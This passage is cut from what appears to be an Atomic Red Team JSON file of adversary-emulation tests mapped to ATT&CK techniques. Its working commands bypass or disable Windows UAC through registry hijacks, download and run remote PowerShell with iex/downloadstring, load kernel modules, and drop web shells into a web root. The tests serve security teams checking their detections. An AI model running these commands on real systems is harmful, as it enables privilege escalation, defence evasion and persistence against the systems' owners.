			"cleanup_command": "Remove-Item \"HKCU:\\software\\classes\\ms-settings\" -force -Recurse -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1548.002",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Bypass UAC using ComputerDefaults (PowerShell)",
		"auto_generated_guid": "3c51abf2-44bf-42d8-9111-dc96ff66750f",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"executable_binary": {
				"description": "Binary to execute with UAC Bypass",
				"type": "path",
				"default": "C:\\Windows\\System32\\cmd.exe"
			}
		},
		"executor": {
			"command": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"#{executable_binary}\" -Force\nStart-Process \"C:\\Windows\\System32\\ComputerDefaults.exe\"\n",
			"cleanup_command": "Remove-Item \"HKCU:\\software\\classes\\ms-settings\" -force -Recurse -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1548.002",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Bypass UAC by Mocking Trusted Directories",
		"auto_generated_guid": "f7a35090-6f7f-4f64-bb47-d657bf5b10c1",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"executable_binary": {
				"description": "Binary to execute with UAC Bypass",
				"type": "path",
				"default": "C:\\Windows\\System32\\cmd.exe"
			}
		},
		"executor": {
			"command": "mkdir \"\\\\?\\C:\\Windows \\System32\\\"\ncopy \"#{executable_binary}\" \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"\nmklink c:\\testbypass.exe \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"\n",
			"cleanup_command": "rd \"\\\\?\\C:\\Windows \\\" /S /Q >nul 2>nul\ndel \"c:\\testbypass.exe\" >nul 2>nul\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1548.002",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Bypass UAC using sdclt DelegateExecute",
		"auto_generated_guid": "3be891eb-4608-4173-87e8-78b494c029b7",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"command_to_execute": {
				"description": "Command to execute",
				"type": "string",
				"default": "cmd.exe /c notepad.exe"
			}
		},
		"executor": {
			"command": "New-Item -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Value '#{command_to_execute}'\nNew-ItemProperty -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Name \"DelegateExecute\"\nStart-Process -FilePath $env:windir\\system32\\sdclt.exe\nStart-Sleep -s 3\n",
			"cleanup_command": "Remove-Item -Path \"HKCU:\\Software\\Classes\\Folder\" -Recurse -Force -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1548.002",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Disable UAC using reg.exe",
		"auto_generated_guid": "9e8af564-53ec-407e-aaa8-3cb20c3af7f9",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f\n",
			"cleanup_command": "reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1 /f\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1548.002",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Bypass UAC using SilentCleanup task",
		"auto_generated_guid": "28104f8a-4ff1-4582-bcf6-699dce156608",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"file_path": {
				"description": "Path to the bat file",
				"type": "string",
				"default": "PathToAtomicsFolder\\T1548.002\\src\\T1548.002.bat"
			}
		},
		"executor": {
			"command": "\"#{file_path}\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1548.002",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "UACME Bypass Method 23",
		"auto_generated_guid": "8ceab7a2-563a-47d2-b5ba-0995211128d7",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"uacme_exe": {
				"description": "Path to uacme executable",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\23 Akagi64.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n",
				"prereq_command": "$tempPath = cmd /c echo #{uacme_exe}\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n"
			}
		],
		"executor": {
			"command": "\"#{uacme_exe}\"\n",
			"cleanup_command": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1548.002",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "UACME Bypass Method 31",
		"auto_generated_guid": "b0f76240-9f33-4d34-90e8-3a7d501beb15",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"uacme_exe": {
				"description": "Path to uacme executable",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\31 Akagi64.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n",
				"prereq_command": "$tempPath = cmd /c echo #{uacme_exe}\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n"
			}
		],
		"executor": {
			"command": "\"#{uacme_exe}\"\n",
			"cleanup_command": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1548.002",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "UACME Bypass Method 33",
		"auto_generated_guid": "e514bb03-f71c-4b22-9092-9f961ec6fb03",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"uacme_exe": {
				"description": "Path to uacme executable",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\33 Akagi64.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n",
				"prereq_command": "$tempPath = cmd /c echo #{uacme_exe}\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n"
			}
		],
		"executor": {
			"command": "\"#{uacme_exe}\"\n",
			"cleanup_command": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1548.002",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "UACME Bypass Method 34",
		"auto_generated_guid": "695b2dac-423e-448e-b6ef-5b88e93011d6",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"uacme_exe": {
				"description": "Path to uacme executable",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\34 Akagi64.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n",
				"prereq_command": "$tempPath = cmd /c echo #{uacme_exe}\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n"
			}
		],
		"executor": {
			"command": "\"#{uacme_exe}\"\n",
			"cleanup_command": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1548.002",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "UACME Bypass Method 39",
		"auto_generated_guid": "56163687-081f-47da-bb9c-7b231c5585cf",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"uacme_exe": {
				"description": "Path to uacme executable",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\39 Akagi64.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n",
				"prereq_command": "$tempPath = cmd /c echo #{uacme_exe}\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n"
			}
		],
		"executor": {
			"command": "\"#{uacme_exe}\"\n",
			"cleanup_command": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1548.002",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "UACME Bypass Method 56",
		"auto_generated_guid": "235ec031-cd2d-465d-a7ae-68bab281e80e",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"uacme_exe": {
				"description": "Path to uacme executable",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\56 Akagi64.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n",
				"prereq_command": "$tempPath = cmd /c echo #{uacme_exe}\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n"
			}
		],
		"executor": {
			"command": "\"#{uacme_exe}\"\n",
			"cleanup_command": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1548.002",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "UACME Bypass Method 59",
		"auto_generated_guid": "dfb1b667-4bb8-4a63-a85e-29936ea75f29",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"uacme_exe": {
				"description": "Path to uacme executable",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\59 Akagi64.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n",
				"prereq_command": "$tempPath = cmd /c echo #{uacme_exe}\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n"
			}
		],
		"executor": {
			"command": "\"#{uacme_exe}\"\n",
			"cleanup_command": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1548.002",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "UACME Bypass Method 61",
		"auto_generated_guid": "7825b576-744c-4555-856d-caf3460dc236",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"uacme_exe": {
				"description": "Path to uacme executable",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\61 Akagi64.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n",
				"prereq_command": "$tempPath = cmd /c echo #{uacme_exe}\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n"
			}
		],
		"executor": {
			"command": "\"#{uacme_exe}\"\n",
			"cleanup_command": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1548.002",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "WinPwn - UAC Magic",
		"auto_generated_guid": "964d8bf8-37bc-4fd3-ba36-ad13761ebbcc",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nUACBypass -noninteractive -command \"C:\\windows\\system32\\cmd.exe\" -technique magic",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1548.002",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "WinPwn - UAC Bypass ccmstp technique",
		"auto_generated_guid": "f3c145f9-3c8d-422c-bd99-296a17a8f567",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nUACBypass -noninteractive -command \"C:\\windows\\system32\\calc.exe\" -technique ccmstp",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1548.002",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "WinPwn - UAC Bypass DiskCleanup technique",
		"auto_generated_guid": "1ed67900-66cd-4b09-b546-2a0ef4431a0c",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nUACBypass -noninteractive -command \"C:\\windows\\system32\\cmd.exe\" -technique DiskCleanup",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1548.002",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "WinPwn - UAC Bypass DccwBypassUAC technique",
		"auto_generated_guid": "2b61977b-ae2d-4ae4-89cb-5c36c89586be",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1548.002",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Disable UAC admin consent prompt via ConsentPromptBehaviorAdmin registry key",
		"auto_generated_guid": "251c5936-569f-42f4-9ac2-87a173b9e9b8",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$orgValue =(Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin).ConsentPromptBehaviorAdmin\nSet-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin -Value 0 -Type Dword -Force",
			"cleanup_command": "Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin -Value $orgValue -Type Dword -Force\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1548.002",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "UAC Bypass with WSReset Registry Modification",
		"auto_generated_guid": "3b96673f-9c92-40f1-8a3e-ca060846f8d9",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"commandpath": {
				"description": "Registry path",
				"type": "string",
				"default": "HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command"
			},
			"commandtorun": {
				"description": "Command to run",
				"type": "string",
				"default": "C:\\Windows\\System32\\cmd.exe /c start cmd.exe"
			}
		},
		"executor": {
			"command": "New-Item #{commandpath} -Force | Out-Null\nNew-ItemProperty -Path #{commandpath} -Name \"DelegateExecute\" -Value \"\" -Force | Out-Null\nSet-ItemProperty -Path #{commandpath} -Name \"(default)\" -Value \"#{commandtorun}\" -Force -ErrorAction SilentlyContinue | Out-Null\n$Process = Start-Process -FilePath \"C:\\Windows\\System32\\WSReset.exe\" -WindowStyle Hidden",
			"cleanup_command": "Remove-Item #{commandpath} -Recurse -Force\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1548.002",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Disable UAC - Switch to the secure desktop when prompting for elevation via registry key",
		"auto_generated_guid": "85f3a526-4cfa-4fe7-98c1-dea99be025c7",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force",
			"cleanup_command": "Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name PromptOnSecureDesktop -Value 1 -Type Dword -Force\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1548.002",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Disable UAC notification via registry keys",
		"auto_generated_guid": "160a7c77-b00e-4111-9e45-7c2a44eda3fd",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Security Center\" /v UACDisableNotify /t REG_DWORD /d 1 /f\n",
			"cleanup_command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Security Center\" /v UACDisableNotify /t REG_DWORD /d 0 /f\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1548.002",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Disable ConsentPromptBehaviorAdmin via registry keys",
		"auto_generated_guid": "a768aaa2-2442-475c-8990-69cf33af0f4e",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f\n",
			"cleanup_command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 5 /f\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1548.002",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Linux - Load Kernel Module via insmod",
		"auto_generated_guid": "687dcb93-9656-4853-9c36-9977315e9d23",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"module_name": {
				"description": "Name of the kernel module name.",
				"type": "string",
				"default": "T1547006"
			},
			"module_path": {
				"description": "Folder used to store the module.",
				"type": "path",
				"default": "/tmp/T1547.006/T1547006.ko"
			},
			"temp_folder": {
				"description": "Temp folder used to compile the code.",
				"type": "path",
				"default": "/tmp/T1547.006"
			},
			"module_source_path": {
				"description": "Path to download Gsecdump binary file",
				"type": "path",
				"default": "PathToAtomicsFolder/T1547.006/src"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "The kernel module must exist on disk at specified location\n",
				"prereq_command": "if [ -f #{module_path} ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "if [ ! -d #{temp_folder} ]; then mkdir #{temp_folder}; touch #{temp_folder}/safe_to_delete; fi;\ncp #{module_source_path}/* #{temp_folder}/\ncd #{temp_folder}; make\nif [ ! -f #{module_path} ]; then mv #{temp_folder}/#{module_name}.ko #{module_path}; fi;\n"
			}
		],
		"executor": {
			"command": "sudo insmod #{module_path}\n",
			"cleanup_command": "sudo rmmod #{module_name}\n[ -f #{temp_folder}/safe_to_delete ] && rm -rf #{temp_folder}\n",
			"name": "bash",
			"elevation_required": true
		},
		"attack_technique": "T1547.006",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "MacOS - Load Kernel Module via kextload and kmutil",
		"auto_generated_guid": "f4391089-d3a5-4dd1-ab22-0419527f2672",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"module_path": {
				"description": "Folder used to store the module.",
				"type": "path",
				"default": "/Library/Extensions/SoftRAID.kext"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "The kernel module must exist on disk at specified location\n",
				"prereq_command": "if [ -d #{module_path} ] ; then exit 0; else exit 1 ; fi\n",
				"get_prereq_command": "exit 1\n"
			}
		],
		"executor": {
			"command": "set -x\nsudo kextload #{module_path}\nkextstat 2>/dev/null | grep SoftRAID\nsudo kextunload #{module_path}\nsudo kmutil load -p #{module_path}\nkextstat 2>/dev/null | grep SoftRAID\nsudo kmutil unload -p #{module_path}\n",
			"name": "bash",
			"elevation_required": true
		},
		"attack_technique": "T1547.006",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "MacOS - Load Kernel Module via KextManagerLoadKextWithURL()",
		"auto_generated_guid": "f0007753-beb3-41ea-9948-760785e4c1e5",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"src_path": {
				"description": "Folder used to store the module.",
				"type": "path",
				"default": "PathToAtomicsFolder/T1547.006/src/macos_kextload.c"
			},
			"exe_path": {
				"description": "Folder used to store the module.",
				"type": "path",
				"default": "/tmp/T1547006_iokit_loader"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "The kernel module must exist on disk at specified location\n",
				"prereq_command": "if [ -f \"#{exe_path}\" ]; then exit 0 ; else exit 1; fi\n",
				"get_prereq_command": "cc -o #{exe_path} #{src_path} -framework IOKit -framework Foundation\n"
			}
		],
		"executor": {
			"command": "sudo #{exe_path}\nkextstat 2>/dev/null | grep SoftRAID\nsudo kextunload /Library/Extensions/SoftRAID.kext\n",
			"name": "bash",
			"elevation_required": true,
			"cleanup_command": "rm -f #{exe_path}\n"
		},
		"attack_technique": "T1547.006",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Snake Malware Kernel Driver Comadmin",
		"auto_generated_guid": "e5cb5564-cc7b-4050-86e8-f2d9eec1941f",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$examplePath = Join-Path $env:windir \"system32\\Com\"; if (-not (Test-Path $examplePath)) { New-Item -ItemType Directory -Path $examplePath | Out-Null }; $exampleName = \"comadmin.dat\"; $exampleFullPath = Join-Path $examplePath $exampleName; $randomBytes = New-Object Byte[] 0x1000; (New-Object Random).NextBytes($randomBytes); [System.IO.File]::WriteAllBytes($exampleFullPath, $randomBytes)\n",
			"cleanup_command": "$examplePath = Join-Path $env:windir \"system32\\Com\"; $exampleName = \"comadmin.dat\"; $exampleFullPath = Join-Path $examplePath $exampleName; if (Test-Path $exampleFullPath) { Remove-Item $exampleFullPath -Force }\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1547.006",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Web Shell Written to Disk",
		"auto_generated_guid": "0a2ce662-1efa-496f-a472-2fe7b080db16",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"web_shell_path": {
				"description": "The path to drop the web shell",
				"type": "string",
				"default": "C:\\inetpub\\wwwroot"
			},
			"web_shells": {
				"description": "Path of Web Shell",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1505.003\\src"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Web shell must exist on disk at specified location (#{web_shells})\n",
				"prereq_command": "if (Test-Path \"#{web_shells}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"#{web_shells}\" -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/b.jsp\" -OutFile \"#{web_shells}/b.jsp\"\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/tests.jsp\" -OutFile \"#{web_shells}/tests.jsp\"\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/cmd.aspx\" -OutFile \"#{web_shells}/cmd.aspx\"\n"
			}
		],
		"executor": {
			"command": "xcopy /I /Y \"#{web_shells}\" #{web_shell_path}\n",
			"cleanup_command": "del #{web_shell_path}\\b.jsp /q >nul 2>&1\ndel #{web_shell_path}\\tests.jsp /q >nul 2>&1\ndel #{web_shell_path}\\cmd.aspx /q >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1505.003",
		"phases": ["persistence"]
	},
	{
		"name": "Exfiltration Over Alternative Protocol - SSH",
		"auto_generated_guid": "f6786cc8-beda-4915-a4d6-ac2f193bb988",
